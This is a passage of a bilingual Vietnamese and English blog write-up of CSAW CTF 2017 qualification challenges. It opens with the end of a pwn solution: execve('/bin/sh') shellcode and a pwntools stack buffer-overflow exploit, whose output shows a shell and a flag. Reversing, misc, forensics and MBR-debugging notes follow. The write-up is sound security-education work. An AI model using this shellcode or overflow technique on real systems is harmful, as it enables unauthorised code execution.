+   7:   48 bb ff 2f 62 69 6e    movabs rbx,0x68732f6e69622fff
+   e:   2f 73 68 
+  11:   48 c1 eb 08             shr    rbx,0x8
+  15:   53                      push   rbx
+  16:   48 89 e7                mov    rdi,rsp
+  19:   48 31 c0                xor    rax,rax
+  1c:   50                      push   rax
+  1d:   57                      push   rdi
+  1e:   48 89 e6                mov    rsi,rsp
+  21:   b0 3b                   mov    al,0x3b
+  23:   0f 05                   syscall
+</code></pre>
+
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+s = remote('pwn.chal.csaw.io', 8464)
+
+raw_input('Exploit?')
+shellcode = &quot;\x48\x83\xEC\x48\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05&quot;
+
+s.recvuntil('[*]Location:')
+leak_buffer = s.recvuntil('\n').strip()
+print leak_buffer
+leak_buffer = int(leak_buffer, 16)
+s.recvuntil('[*]Command:')
+
+print 'Shellcode is at:', hex(leak_buffer)
+
+payload = ''
+payload += shellcode
+payload += '\x90' * (40 - len(shellcode))
+payload += p64(leak_buffer)
+s.sendline(payload)
+s.interactive()
+s.close()
+</code></pre>
+
+<pre><code class="language-r">➜ python exploit.py 
+[+] Opening connection to pwn.chal.csaw.io on port 8464: Done
+Exploit?
+0x7ffe3cf25d80
+Shellcode is at: 0x7ffe3cf25d80
+[*] Switching to interactive mode
+$ id
+uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
+$ whoami
+pilot
+$ cat flag
+flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}
+$  
+</code></pre>
+
+<h1 id="re-tablez-100-pts">RE: tablez (100 pts.)</h1>
+
+<p><a href="#english-tablez">English version here</a></p>
+
+<h5 id="vietnamese-1">Vietnamese</h5>
+
+<pre><code class="language-r">➜  file tablez 
+tablez: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=72adea86090fb7deeb319e95681fd2c669dcc503, not stripped
+</code></pre>
+
+<p>Như vậy rất may mắn là binary này không bị stripped. Mở binary lên bằng r2 và xem qua hàm main thì có một số điểm đáng chú ý sau:</p>
+
+<ol>
+<li>Dữ liệu được hardcoded từ <code>0x000008ba</code> tới <code>0x00000908</code></li>
+<li>Input được nhập vào biến <code>local_90h</code> ở <code>0x00000924</code></li>
+<li>Một vòng lặp gọi hàm <code>sym.get_tbl_entry</code> với tham số là input. Kết quả hàm này trả về được dùng để thay thế các ký tự trên input buffer.</li>
+<li>input buffer sau khi bị biến đổi qua vòng lặp ở 3 sẽ được so sánh với dữ liệu hardcoded ở 1 bằng hàm strncmp (<code>0x000009f7</code>). <code>0x26</code> ký tự đầu tiên sẽ được so sánh.</li>
+</ol>
+
+<p>Hàm <code>sym.get_tbl_entry</code> hoạt động như sau:</p>
+
+<pre><code class="language-C">for (int i = 0; i &lt;= 0xfe; i++) {
+  if (trans_tbl[i * 2] == input[i]) {
+    return trans_tbl[i * 2 + 1];
+  }
+}
+return 0;
+</code></pre>
+
+<p>với <code>trans_tbl</code> là một biến toàn cục đã được viết trước.</p>
+
+<p>Như vậy, cách làm của mình như sau:</p>
+
+<ol>
+<li>Lấy dữ liệu từ bản trans_tbl và dự liệu hardcode trong hàm main ra (mình gọi là password).
+Để lấy dữ liệu từ bảng <code>obj.trans_tbl</code>: <code>pr 0xff@ obj.trans_tbl &gt; data.bin</code>
+(Print Raw 0xff bytes at address of obj.trans_tbl, redirect output to file data.bin)</li>
+<li>Với mỗi ký tự trong password, bruteforce tất cả các ký tự ASCII để tìm một ký tự c sao cho c sau khi qua hàm <code>get_tbl_entry</code> sẽ biến đổi thành ký tự ở vị trí tương ứng trong password.</li>
+</ol>
+
+<p>Solution:</p>
+
+<pre><code class="language-python">from pwn import *
+from string import printable
+
+def get_char(c):
+    global trans_tbl
+    for i in range(0xfe + 1):
+        if trans_tbl[i * 2] == c:
+            return trans_tbl[i * 2 + 1]
+    return 0
+
+trans_tbl = open('trans_tbl').read()
+password = ''
+password += p64(0xb1e711f59d73b327)
+password += p64(0x30f4f9f9b399beb3)
+password += p64(0xb19965237399711b)
+password += p64(0xf9279923be111165)
+password += p64(0x65059923)
+password = password.strip('\x00')
+
+flag = ''
+for i in range(len(password)):
+    for c in printable:
+        if get_char(c) == password[i]:
+            flag += c
+            break
+print flag
+</code></pre>
+
+<p><a name="english-tablez"></a></p>
+
+<h5 id="english-1">English</h5>
+
+<pre><code class="language-r">➜  file tablez 
+tablez: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=72adea86090fb7deeb319e95681fd2c669dcc503, not stripped
+</code></pre>
+
+<p>Fortunately, this binary is not stripped. After examining the main function, there are several noticeable points:</p>
+
+<ol>
+<li>There is hardcoded data, seen from <code>0x000008ba</code> to <code>0x00000908</code></li>
+<li>The input buffer is <code>local_90h</code>, seen at <code>0x00000924</code></li>
+<li>A loop calls to <code>sym.get_tbl_entry</code> with the input buffer as the parameter. The returned results are used to replace data on the input buffer.</li>
+<li>The input buffer after being transformed in #3 is compared to the hardcoded data in #1 using strncmp (<code>0x000009f7</code>). The first <code>0x26</code> characters are compared.</li>
+</ol>
+
+<p>Pseudo code for <code>sym.get_tbl_entry</code>:</p>
+
+<pre><code class="language-C">for (int i = 0; i &lt;= 0xfe; i++) {
+  if (trans_tbl[i * 2] == input[i]) {
+    return trans_tbl[i * 2 + 1];
+  }
+}
+return 0;
+</code></pre>
+
+<p>with <code>trans_tbl</code> is an initialized global variable.</p>
+
+<p>My solution:</p>
+
+<ol>
+<li>Extract data from <code>trans_tbl</code> and the hardcoded data at the beginning of main (called password).
+To extract data from <code>obj.trans_tbl</code> using r2: <code>pr 0xff@ obj.trans_tbl &gt; data.bin</code>
+(Print Raw 0xff bytes at address of obj.trans_tbl, redirect output to file data.bin)</li>
+<li>For each character in the password, bruteforce all ASCII characters to find a character c such that c after being transformed by <code>get_tbl_entry</code> will be the corressponding character in the password.</li>
+</ol>
+
+<p>Solution:</p>
+
+<pre><code class="language-python">from pwn import *
+from string import printable
+
+def get_char(c):
+    global trans_tbl
+    for i in range(0xfe + 1):
+        if trans_tbl[i * 2] == c:
+            return trans_tbl[i * 2 + 1]
+    return 0
+
+trans_tbl = open('trans_tbl').read()
+password = ''
+password += p64(0xb1e711f59d73b327)
+password += p64(0x30f4f9f9b399beb3)
+password += p64(0xb19965237399711b)
+password += p64(0xf9279923be111165)
+password += p64(0x65059923)
+password = password.strip('\x00')
+
+flag = ''
+for i in range(len(password)):
+    for c in printable:
+        if get_char(c) == password[i]:
+            flag += c
+            break
+print flag
+</code></pre>
+
+<h1 id="misc-twitch-100-pts">Misc: Twitch (100 pts.)</h1>
+
+<p><a href="#english-twitch">English version here</a></p>
+
+<h5 id="vietnamese-2">Vietnamese</h5>
+
+<p>Bài này là bài bựa nhất trong cả đề. Đại khái là họ stream một cái shell lên twitch. Để điều khiển shell đó thì người xem twitch sẽ vote phím nào được ấn trên bàn phím bằng cách gõ vào phần chat. Để lấy được flag bài này thì số người đó phải exploit 1 binary bị buffer overflow. Mình thì không rảnh nhảy vào vote nên chỉ xem xong cướp flag thôi =)) Điều bựa là mỗi khi flag được lấy ra thành công thì sau vài phút, cái máy tính được stream sẽ tự động reboot và ai không lấy kịp flag thì lại ngồi chờ =))
+<img src="/img/csaw-ctf-qualification-2017/misc100.jpg" alt="misc100" /></p>
+
+<p><a name="english-twitch"></a></p>
+
+<h5 id="english-2">English</h5>
+
+<p>This is quite a funny challenge. All the players need to exploit a binary and the shell is streamed on twitch and controlled via a twitch chat. All the players need to vote for the character that they want to type in the shell. To get the flag, you need to be there at the right moment since the machine which contains the binary and the shell reboots whenever the flag is successfully printed out.</p>
+
+<h1 id="forensics-bestrouter-200-pts">Forensics: Bestrouter (200 pts.)</h1>
+
+<p>Bài này khá vớ vẩn. Download file đính kèm về giải nén ra thì ta sẽ được một file <code>.img</code>, là một file image của rasberry pi. Mình dùng lệnh sau để mount file này trên linux, từ đó sẽ đọc được dữ liệu trong file như cấu trúc của một linux filesystem thông thường:</p>
+
+<pre><code class="language-r">sudo mount disk.img ./mnt
+</code></pre>
+
+<p>(Lúc làm bài này mình làm theo hướng dẫn ở <a href="https://www.linuxquestions.org/questions/linux-general-1/how-to-mount-img-file-882386/#post4365399">đây</a>, thi xong mình xóa xừ nó file kia đi rồi nên không nhớ cụ thể câu lệnh là gì nữa :P )</p>
+
+<p>Mở lên và truy cập vào thư mục <code>/var/www/html</code> sẽ thấy được mã nguồn của trang web cần đăng nhập: <code>http://forensics.chal.csaw.io:3287/</code>
+Trên windows, file này có thể được mở bằng phần mềm chuyên dụng cho forensics như Autopsy. Bài này do ngu người không để ý có cái trang web kia nên mình tìm thấy mật khẩu rồi mãi không biết dùng làm gì :D</p>
+
+<h1 id="re-realism-400-pts-unsolved">RE: realism (400 pts. unsolved)</h1>
+
+<p><a href="#english-realism">English version here</a></p>
+
+<h5 id="vietnamese-3">Vietnamese</h5>
+
+<p>Đây là lần đầu tiên trong 1 CTF mà mình dám động tới một bài 400. Trước khi được thông não, mình thường còn chẳng xem đề bài mấy bài này vì nghĩ chỉ có rất khủng mới làm được. Lần này khi mở lên thấy bài này hơn 30 người làm được sau ngày đầu tiên, mình nghĩ rằng đây không phải bài khó nên quyết định thử sức. Đây là một quyết định vừa đúng lại vừa có phần hơi ngu người vì làm mình bỏ lỡ mất bài pwn 200 khá ngon ăn.</p>
+
+<pre><code class="language-r">➜  file main.bin
+main.bin: DOS/MBR boot sector
+</code></pre>
+
+<p>Sau một hồi tìm hiểu, mình đã chạy được file này. Kết quả ra như sau:</p>
+
+<p><img src="/img/csaw-ctf-qualification-2017/re400-1.png" alt="QEMU-Run" /></p>
+
+<p>Đây là lần đầu tiên mình reverse/debug 1 MBR. Cách cài đặt môi trường để debug như sau:</p>
+
+<p>Link tham khảo: <a href="https://rwmj.wordpress.com/2011/10/12/tip-debugging-the-early-boot-process-with-qemu-and-gdb/">https://rwmj.wordpress.com/2011/10/12/tip-debugging-the-early-boot-process-with-qemu-and-gdb/</a></p>
+
+<ol>
+<li>Cài đặt qemu-system-i386</li>
+<li>Chạy MBR và debug với GDB như sau:
+
+<ol>
+<li><code>qemu-system-i386 -s -S -drive format=raw,file=main.bin</code>: Lệnh này load file MBR nhưng không chạy CPU, đồng thời mở 1 gdbserver tại port 1234 ở localhost để có thể dùng gdb debug</li>
+<li>Vào gdb:</li>
+<li><code>target remote localhost:1234</code>: Kết nối để gdbserver được khởi tạo ở bước trên</li>
+</ol></li>
+</ol>
+
+              </section>
+
+              <footer class="post-footer">
+                  <div class="post-tags">
+            
+            
+                <a href="https://protegototalum.faith/tags/csaw-ctf-17">CSAW CTF 17</a>
+            
+                <a href="https://protegototalum.faith/tags/ctf">CTF</a>
+            
+                <a href="https://protegototalum.faith/tags/reversing">reversing</a>
+            
+                <a href="https://protegototalum.faith/tags/pwn">pwn</a>
+            
+            
+                  </div>
+                
+                    <div class="post-share">
+                        <a class="fa fa-reddit-alien" href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent(window.location); return false">
+                            <span>Reddit</span>
+                        </a>
+                        <a class="fa fa-twitter" href="https://twitter.com/share?text=CSAW%20CTF%202017%20Qualification&url=https%3a%2f%2fprotegototalum.faith%2fpost%2fcsaw-ctf-17-qual%2f" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                            <span>Twitter</span>
+                        </a>
+                    </div>
+            
+              </footer>
+
+            
+                <aside class="post-comments">
+    
+    
+    <div id="disqus_thread"></div>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    
+    
+</aside>
+
+            
+            </div>
+
+            <nav class="post-nav">
+                
+                    <a class="post-nav-item post-nav-next" href="https://protegototalum.faith/post/ub-lockdown-v3/">
+                        <section class="post-nav-teaser">
+                            <span class="post-nav-icon"><i class="fa fa-chevron-left"></i></span>
+                            <span class="post-nav-info">
+                                <h4 class="post-nav-title">UB Lockdown V3</h4>
+                            </span>
+                        </section>
+                    </a>
+                
+                
+                <div class="clear"></div>
+            </nav>
+
+        </div>
+    </article>
+</main>
+
+                <div id="body-class" style="display: none;"></div>
+                <footer id="footer">
+                    <section class="credits">
+                        <span class="credits-license"><i class="fa fa-copyright"></i>2019 Protego Totalum Security
+                    </span>
+                    </section>
+                </footer>
+                
+
+                
+<div id="menu" data-target="menu">
+    <div class="menu-header">
+        <span class="menu-label">Main Menu</span>
+        <a class="menu-close" data-action="menu" data-target="menu"></a>
+    </div>
+
+    <div class="menu-list">
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/about/">About me</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/projects/">Projects</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/tags/">Tags</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/categories/">Categories</a>
+        </li>
+        
+        <li class="menu-list-item menu-list-social">
+            <a href="https://twitter.com/flyingpassword" title="Protego Totalum Security on Twitter"><i class="fa fa-twitter"></i></a>
+            <a href="https://linkedin.com/in/ducphanduy" title="Protego Totalum Security on LinkedIn"><i class="fa fa-linkedin"></i></a>
+            <a href="https://github.com/ducphanduyagentp" title="Protego Totalum Security on GitHub"><i class="fa fa-github"></i></a>
+        </li>
+    </div>
+
+</div>
+
+
+                
+                <div class="overlay"></div>
+            </div>
+        </section>
+
+    <script async src="/js/main.js"></script>
+
+
+
+  <noscript><link rel="stylesheet" href="/css/main.css"></noscript>
+</body>
+</html>
+
